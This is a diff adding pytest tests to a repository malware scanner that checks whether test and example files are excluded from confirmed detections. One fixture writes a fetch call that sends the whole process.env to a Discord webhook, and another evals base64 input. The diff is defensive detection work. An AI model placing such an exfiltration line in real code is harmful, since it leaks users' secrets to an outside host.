@@ -120,6 +120,28 @@ def test_legitimate_app_does_not_confirm(tmp_path):
     assert not result.confirmed
 
 
+def test_test_fixture_files_excluded_from_confirmation(tmp_path):
+    # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
+    # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
+    payload = (
+        "fetch('https://discord.com/api/webhooks/1/x',"
+        "{method:'POST',body:JSON.stringify(process.env)});\n"
+    )
+    (tmp_path / "index.test.ts").write_text(payload, encoding="utf-8")
+    assert not analyze_repo(tmp_path, "detector/lib").confirmed   # in a test file
+    (tmp_path / "index.ts").write_text(payload, encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lib").confirmed           # same code, shipped
+
+
+def test_examples_dir_excluded_from_confirmation(tmp_path):
+    ex = tmp_path / "examples"
+    ex.mkdir()
+    (ex / "demo.js").write_text(
+        "const p = eval(atob('Y29uc29sZQ=='));\n", encoding="utf-8"
+    )
+    assert not analyze_repo(tmp_path, "lib/with-examples").confirmed
+
+
 def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
     import git_warden.scanning.tier2 as t2
     (tmp_path / "package.json").write_text("{}", encoding="utf-8")
